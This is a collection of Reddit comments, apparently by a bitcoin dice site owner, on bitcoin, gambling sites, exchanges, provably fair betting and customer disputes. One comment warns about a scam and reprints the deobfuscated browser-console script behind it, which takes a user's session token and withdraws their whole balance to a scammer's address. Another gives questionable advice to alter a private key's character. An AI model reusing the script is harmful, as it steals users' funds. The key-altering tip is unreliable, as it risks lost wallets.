I don't understand why you'd post something like this. I went so far out of my way to resolve that issue for you and ended up paying you in a manner we agreed upon despite this being entirely your fault. I'm not sure if you're the one I talked to regarding your issue and if you share reddit accounts but I'm very disappointed.
Also, you shouldn't comment on operational security without mentioning the password of your account which led to your issue. I'm gonna try and be the bigger person and not mention what it was, however it would completely discredit your entire post and issue.

You're correct, I edited that shortly after posting because it wasn't really all that accurate. Two of our founders myself included are intermediate level coders and our third founder had coded a variety of websites including our first two versions (PHP).
As far as this issue is concerned we may as well have been clueless or had zero experience. The two people that handle our back-end are quite experienced though. I edited that though because it implied we had no understanding of the inner workings of PD, which isn't true.
@_date: 2015-06-29 06:21:19
I hid the post from the subreddit after several days of letting it sit there AFTER the resolution. You mentioned you'd remove it yourself as we had resolved this and I figured you had forgotten so I did so. There was clearly no attempt to be deceptive, otherwise I would have just instantly removed it. 
Also in terms of customer service, I responded very late but I personally handled this for you and spent hours looking into it. And I refunded you in full despite this being an error on your side. I don't handle the back-end of the website either, we have an experienced individual doing that. Also, I think it's foolish to call 10 attempts an hour a (brute-force), perhaps I threw around that term too loosely. Our login is perfectly secure and limited to 10 tries per hour. It is not our fault your password was literally one of the top 10 most common passwords."
Judging by our conversation on your support ticket I thought you could not be happier given the result, but apparently I was wrong. Attention is more important than integrity for some websites, perhaps this is why so many people despise most bitcoin gaming sites.

Bitcoin and everything related to bitcoin is a gamble if you are passing on trust to a third party. The whole purpose of bitcoin is that you own your money, don't give up that right. It is honestly so sad that thousands have to suffer due to the actions of one incompetent man/company but now the dead weight is cut off, let's look towards the future. If you are looking to run a bitcoin business look at the failures of gox and don't repeat them. My best wishes go out to those effected by this.

The proper bill would be one that suggests leaving bitcoin alone for a few years. Many can argue that bitcoin as a currency is much worse than bitcoin as a property, not in terms of use but taxes. The truth of the matter is, bitcoin is not simply currency nor property.

Thanks for bringing this to my attention, I've mentioned that we're launching Primedice 3 in about a week or so and we're completely overhauling the provably fair system. As mentioned by bobalot there are major ways for any site to rip off their bettors as we've seen with many new casinos. We're fully committed to being as transparent as possible and will do our best to create the most fair environment to bet in. I think provably fair is dangerous as it can give a bettor false confidence. What needs to happen is a trusted third party has to eventually take over the reigns and monitor all bets for fairness. 
The fix you brought up likely wouldn't work, revealing source code is dangerous for a variety of reasons with this type of website. Mainly due to the fact that more and more clones will pop-up using that code and scam others. 
We're going to enter open beta on PD3 soon and I'd be more than happy to let you check out our new system and see if it checks out with you.

Certain altcoins can serve as a bit of a gateway towards bitcoin in my opinion. An example of this is dogecoin, a buddy of mine had bought dogecoin as a joke despite having no interest in cryptocurrency or bitcoin. He's now become interested in bitcoin and has since invested in bitcoin as well. 
On the other hand, coins like litecoin only take away from hashing power and investments behind bitcoin. These are purely speculative and just a vehicle for those who had "missed the boat".

Right now buying bitcoins is difficult, if we want bitcoin to grow we can't rely on businesses like mtgox to act as a major exchanger. Larger companies would have far more power to handle banking and make buying bitcoins very simple. All coins I've purchased throughout the past year were through bitinstant, and OTC which is less hassle than using the exchanges  but hardly user friendly.

Also going back to your point on volatility, your argument about gold being equally volatile doesn't stand. This is simply due to the fact that there is much greater volume and thus liquidity when compared to bitcoin. If companies like paypal got involved which they will when regulation is more clear it will directly lead to increased liquidity as it will become simple and safe to exchange coins for cash.

Note that this is not a common occurrence, he had gambled 18,000+ coins before reaching this win streak. If you gamble you will always lose over time. 
I was hesitant to post this here as reddit is very anti gambling for good reason, however this player made 250-300k profit in one minute which I find incredible. He ended up losing some of it but still exited with a hefty overall profit of ~200 coins. If he continues gambling on primedice, I predict that he will inevitably lose at some point.

@_date: 2014-01-27 22:31:59
What I'm trying to say is if regulation became more clear it would reduce the volatility of bitcoins which would attract big players like paypal. Paypal has stated several times they are not interested in getting involved in bitcoin until it is more stable and has clear regulation. If services such as paypal and google were able to offer services people could shift their trust to them rather than people like tradefortress with inputs.io. It's difficult to have a 100% trustless system for people who value convenience.

My money is on airbnb. The CEO of coinbase used to work there and is likely on good terms, it will absolutely happen.

Circle is a group of opportunists, they understand that regulation will create a massive barrier to entry which will allow them to corner the market. This of course will be corrected as bitcoin gains more and more momentum and attracts other big players. 
The goal of circle like most companies is simply to generate as much profit as possible. Regulation will allow them to do this. It isn't necessarily a bad thing either for bitcoin users.

Foodler was one of the first major services to accept bitcoin so their implementation might be a bit off. They were an incredible value for a long period of time as they would credit you at mtgox rates when gox was $100 over other exchanges.
There is no real incentive to using bitcoin there now, but they do have a general rewards system and their service has been excellent in my experience. Hopefully merchants will slowly start passing on incentives to bitcoiners like gyft has done.

Hey, PD here.
This wasn't exactly an exploit, basically someone was spamming a javascript pastebin called "primedice exploit" which when ran in a browser console would withdraw a user's coins to the scammers address. So basically anyone effected would have to be both not very bright and looking to "exploit" primedice. 
There's really no way for us to defend against this, please do not run untrusted malicious code in your console. This is important for anyone involved in bitcoin, if you don't understand or trust the code don't run it in your console. 
Here's the code a bitcointalk user Dooglus managed to decipher:
    calculate_nonce = function(seed) {
    return ' + seed + '?access_token=' + localStorage['token'];
    };
    lut = window['$'];
    lut['getJSON'](
    calculate_nonce('users/1'), function(seed) {
    var key1 = 'amount'
    var key2 = 'address'
    var load = {};
    load[key1] = seed['user']['balance'];
    load[key2] = '1UKZqhqW9QfNjEaSBTMqZhX4TWoHG51ju';
    lut['post'](calculate_nonce('withdraw'), load);
    }

People on this subreddit seem to be extremely anti gambling which is understandable given the myriad of sad stories and poor outcomes. I don't see how bitcoin gambling is even remotely negative if done responsibly though.
Gambling is probably the best use of bitcoin right now. Buying goods with fiat/paypal is definitely easier than bitcoin the majority of the time. Gambling is one of the major fields where bitcoin has a crucial advantage. The idea of instant cashouts and deposits is completely revolutionary. Pair that with provable fairness and you have a serious disruption to the gambling industry. Bitcoin dice sites like primedice offer an edge of only 1% which "real money" online casinos can never compete with due to overhead/regulatory costs. 
Gambling has many negative effects on our community if done irresponsibly, but I people must realize that it will be an important factor in pushing bitcoin mainstream.

Paypal isn't sweating at all. As much as everyone in this sub hates Paypal they will all be cheering if Paypal decides to start accepting bitcoin.  
Paypal could easily buy bitpay, coinbase and start accepting bitcoin if they felt enough pressure.
As much as people like myself dislike paypal we're forced to use it often for the same reason we are forced to use Facebook, because all our friends use it. Whenever I send cash to friends using Paypal the fee is very often 0%.
 I don't see Paypal ceasing to exist within the next 10 years. There will always be demand for paypal's services, they will just have to continue to lower fees or accept bitcoin to stay competitive.

Ghash is one of the greatest threats to bitcoin right now in my opinion. They certainly don't have a clean record either after the casino double-spend incident.

In five years I'm willing to wager that the average user's goal through using bitcoin won't be to fight central banks. Even right now bitcoin is quickly becoming less and less of a political tool and more of a practical one. Marc Andreesen's prediction is that Libertarians will turn on bitcoin in the future and I'm inclined to agree to an extent. 
Circle is really no different than Coinbase, we shouldn't be panicking that legitimate companies are taking an interest.

It's understood that you'd only get refunded the USD value at the time of the transaction especially if something such as bitpay is used. Even if bitpay isn't being used I'd say that's a fair assumption.

Hey "STUNNA" here,
I agree that this is a really dumb policy, ultimately though even if Theymos came out and banned account selling it wouldn't prevent it. However, I think it sends the community a wrong message when it is not condemned or at least banned from being done within the bitcointalk forum. 
 I suspended the pay per signature advertisement program last term but if you had come to me sooner I would have directed the payment to you. I genuinely hope Theymos incorporates 2fa to prevent things like this from happening in the future, obviously I don't support the sales of accounts. 
There was some sort of Man in the middle attack on the forum a handful of months ago ( which may have caused your secure account to get stolen. I've been a major advocate for getting 2fa installed and have a 2BTC bounty on it here:

I have zero interest in ripple and have the majority of my worth in bitcoin. However, I think it is really unfair to try and pin Mark as someone plotting to destroy bitcoin. I don't think the people realize how much money mark is losing due to these issues, mtgox has made him unbelievably wealthy and could have made him a billionaire if run properly in the long run.
The truth is Mark is a very incompetent person who cares about bitcoin. He didn't take proper precautions and now the entire community must pay for it, but at the end of the day I'm sure he's feeling the burn more than anyone on this sub. The only thing more damaging to bitcoin than incompetent people  are people like OP who spread fud and baseless conspiracies and make us all look like lunatics.

Please don't buy or invest in this, it just simply isn't worth the risk. Anyone looking to invest their bitcoins needs to always view all possible risks and weigh the expected value of the investment. There is no doubt in my mind that this is a -EV move, you are probably better off gambling than investing in companies like this. 
If you do choose to invest, please don't complain about delayed miners or not receiving one at all.

It's perfectly fine to have an ego, but if you have a messiah complex you probably won't be very fun at parties.
On the topic of the foundation, I don't think it is their job to condemn potentially dangerous businesses. The job of the foundation in my opinion is just to talk to the press and handle bitcoin PR. We need to promote more personal responsibility rather than building up a foundation to destroy the decentralized nature of bitcoin.

This is an old argument with out-dated information. 50-60% of bitcoin transactions are not made on gambling sites in my opinion. The majority of all bitcoin gambling has moved off-chain to websites such as my own (primedice) as well as just-dice. 
On SatoshiDice today which is the only bitcoin gambling site that contributes heavily towards bitcoin transactions, only ~850 transactions were made today and likely from a group of 50-100 people. Compare that number to the 68,000 transactions made today using bitcoin, although much of it is probably just moving funds, there is no way you can argue 50-60% of that is gambling.
One year ago this argument stood as there was nothing to do with your coins other than gamble them, but this is no longer the case as there are countless ways to spend your coins.

I find it ridiculous that people think even a year after the BFL controversies that they can make profit purchasing bitcoin miners. There is always a chance but if you are making that purchase it will almost always be a -EV move, especially when you are ordering from a site with zero track record. 
If you want to get an idea of what companies are selling products at massive scammy profit margins just take a look at who is buying the most advertisement on bitcoinntalk:
* hashfast
* butterflylabs
* Betcoin (unrelated, but widely known for unethical behavior)
* various other mining related companies 
They are spending 10s of thousands a week on ads simply because they will make 100% of whatever someone who clicks on the ad sends them. Otherwise it wouldn't be profitable for them to spend that much for the amount of impressions they'd receive.
Before you purchase anything, use some common sense and do your research. There is no such thing as printing money, take all their promises (lies) with a grain of salt. I guarantee there will be many more hashfasts/BFLs over the coming year and people will continue to blindly buy into them, determined to get their fair share of fools gold.

Just for perspective, Rick Falkvinge published this a few months ago: 
@_date: 2019-11-08 03:22:53
I mean regardless of how you feel about the guy:
1. How is creating an honest and provably fair way for people to gamble as an alternative to all the original scammy websites somehow a negative. Satoshidice was one of the first real use cases of bitcoin. It was the first thing I spent  BTC on and was actually  fun and very low margin (1%).
2. Shapeshift did not hold user funds and never got hacked and one of the most popular trades was probably Shitcoin -&gt; Bitcoin.
3. Okay maybe this is somewhat a fair point, I was very against BCH, S2x etc. But it's really important to recognize why some people did support this and not hold it against them forever. Ultimately the people involved chose not  to go forward with it. This whole us against them attitude is what could ultimately cause bitcoin to continue to split  into smaller and smaller pieces.
This community has completely vilified some of its most instrumental people who made bitcoin a success in the first place. This has pushed them deeper and deeper into altcoin nonsense. Maybe he's your enemy but I don't consider Erik to be an "enemy of bitcoin".
@_date: 2015-02-08 06:40:28
[I've long viewed 999 dice as a blatant scam] ( glad to see this finally get some attention.
Websites like Primedice have extremely strong provably fair implemented to the point where we cannot manipulate a result without it being apparent to users. I will also make the point that it's near impossible to run a casino at a 0.1% edge and expect to break even with max bets that high. PD's max payout fluctuates between 20-40 at a house edge of 1% and one user still took us for thousands of coins. 
Right now the majority of bitcoin casinos have very weak provable fairness which provides a false sense of security to users. There are ways to properly implement (Primedice, justdice) and at this point users should ignore any website that chooses to ignore strong fairness standards.

Just further support for OP's contentions. FINCEN/state regulation make it too difficult for new competition to enter which maintains the difficulty of buying bitcoins.

There seems to be a lot more money in selling the pickaxes than mining the "gold". Some things never change, if you are  purchasing a miner make an informed decision as in most cases you will see a negative ROI. Always factor in the strong chance you will get a delayed shipment as well.

A lot of the time when incidents like this occur with bitcoin sites, people will rise up with fake claims to attempt to extort these companies into sending them money.
 If someone is spamming the chatbox claiming the website is a scam or being disrespectful I think any reasonable moderator/support guy would kick him.

The biggest losses and gains all seem to be through dicing these days. A user recently won 300 coins off my site  (shameless plug) a few weeks ago and just yesterday a user went positive 65 coins then ended at -7 coins profit. 
An interesting thing to note is despite bitcoins increasing in price so quickly the volumes being bet on our site have remained consistent. Just goes to show you that not everyone is looking at bitcoin in terms of USD value or the gambling scene is simply growing.
The biggest wins/losses through btc gambling were definitely on JD though with nakowa winning and losing massive amounts about a month ago.

Paypal: Massive fees and additional fees for currency conversion. Chargebacks...
Bitcoin: Send countless thousands worth of BTC at the click of a button, optional minuscule fee.

In 2009 when I first heard about Bitcoin, I thought it was a joke.  A friend of mine was heavily invested in them and mining them at the time. The reason why I thought it was a joke was because all my other friends explained it to me in such an incorrect way. They basically described it as a ponzi scheme rather than a technology/currency. I never took the initiative to look into it in depth.
Later on I had the opportunity to read and learn about bitcoin and have been hooked since. Those friends that called it a scam are all wishing they had given it a chance.

I didn't invest in bitcoin, I bought it because I believed in bitcoin as a technology and currency rather than a speculative vehicle. I was lucky enough to get in at a relatively low price and have decided I'm never interested in selling my stake for US dollars. 
I'm sure quite a few people will panic sell today and I'll be losing a significant amount of money (USD value), and quite frankly I don't care. The past few months have shown me the potential of bitcoin as a global currency. I find it somewhat disturbing that speculators and users of bitcoin alike will experience 20% a day gains and think nothing of it, then as soon as they see a 20% fall you begin seeing the most depressing posts. To anyone who was just looking to make a quick buck, here is your chance to exit.

There are charities that do accept bitcoin so I find this ridiculous. But if you look at it from another perspective, look how much buzz they've generated due to this, they must be loving the attention/ad revenue.
At the end of the day though, it is their money to do with as they please.

Bitinstant has been a reliable service for nearly a year if not more. They have one or two off days a year and everyone goes off on how they are a scam etc. There is room for competition to move in and innovate but bitinstant has helped bitcoin spread and created a system for novices to buy their first coins with ease.
With that being said, I know they are aware of the issues and are working to solve them. Be patient and if you don't like it and are angry, go design a better service and become rich off it. 
Just my thoughts.

I don't understand the great desire to move to mBtc, this is something I've disagreed with for a while. 
The main argument people make is that buyers do not realize that bitcoins are divisible and thus will pass up buying a coin due to the high price. It might be even worse for people to think that mBtc is the default unit and the smallest unit a coin can be divided to. 
Anyone who is willing to verify their identity and go through all the hassle involved with buying a coin will likely realize that they are divisible. 
I think bitcoinity should wait on websites like coinbase/bitstamp to make the change rather than trying to force it. Regardless of their decision I quite enjoy their website and appreciate their hard-work. Maybe I'm just old fashioned.

You are the man! I especially liked it when you talked about how most people who actually spent the time to study and understand bitcoin are believers. I first heard of bitcoin 2 years ago and thought it was a joke until I actually sat down and started reading about how it worked and what the technology behind it was.

Haha, of course. By win I mean convincing him to join the dark side :)

This actually happened a few months ago on primedice. A small handful of people received 100x-1000x+ their cashout due to a glitch until the hot wallet was empty ~80-100 coins. :-|. But yeah, if something sounds too good to be true...

I've learned it is always better to keep your mouth shut. A few seconds of boasting about new found wealth and you are sure to be the one picking up the bar tab/dinner check.

My concern with this is the people who will make use of wall-hacks/aimbots and Ddos attacks to secure a win for themselves. The idea is interesting, there are just a variety of issues which could ruin user experience.

I honestly strongly doubt bitinstant would "take the money and run". They've been a pretty legitimate service for quite a while and are pretty transparent in the sense that all their identities are public on their site. They are likely just encountering some technical issues and will work through it and solve them.

Owner of [PrimeDice]( here, we ended up losing around 100 coins that day total due to paying a few people out 100x. The biggest winner got about 50. We yelled at our developer a lot and it ended up getting sorted that day but only after our hot wallet was empty. Never bothered trying to recover any of the funds. It's was a pretty embarrassing error so I've never even  told anyone about it, friend just linked me this now and was pretty surprised. 
I don't think what you did was wrong, almost anyone would have done the same. Had you offered to return the money I would have just told you to keep it. Grats on your winnings :-)
Also  I don't think advertising a major screw up/bug is a wise marketing tactic :)

Why can't you fight market panic? It's as simple as just ignoring it. I've owned coins for quite a while and have yet to sell a single one. 
Bitcoin is a roller coaster but I know the price will always push forward as the value of this technology is far greater than $10B. 
At the end of the day, bulls win, bears win, and sheep get slaughtered. Always have a plan and don't let yourself be influenced so easily.

I very much appreciated this writeup about bitzino's provably fair and provably fair in general. Very articulate, strong points throughout. 
Is there any system or even an idea which can be implemented which you believe would be a more safe alternative for the bettor?  Basically what I'm asking is if there is anything better than the current "provably fair" systems and how to implement it.
Thanks

This reminds me of when I visited my Grandpa as a child abroad. We went on a very extensive fishing trip, the entire drive to the first location my Grandpa kept talking about his most prized possession which at the time was his fancy fishing rod. 
I'm not sure what was so special about it but my Grandpa was quite proud of it and when we went fishing he'd keep it locked up in the trunk of his car because he refused to risk losing it or me breaking it/dropping it in the water etc. That same first day his car was broken into and the thieves somehow got into the trunk, everything was removed from the car including the radio! The only thing that remained was some frozen meat.
Point of the story is, security is an illusion. Be careful but not too careful.
Sorry for your loss

My recommendation is simply creating a paper wallet, storing it somewhere secure along with an encrypted flashdrive. For added security on the paper wallet change one of the characters of your private key and replace it with a random character that you will remember. When it is time to access your wallet just remember to swap out that character for the real one.

Overall this definitely sounds great. Spreading bitcoins to 1.3 billion + potential new users is definitely positive. Here's hoping that bitcoins become huge in China!
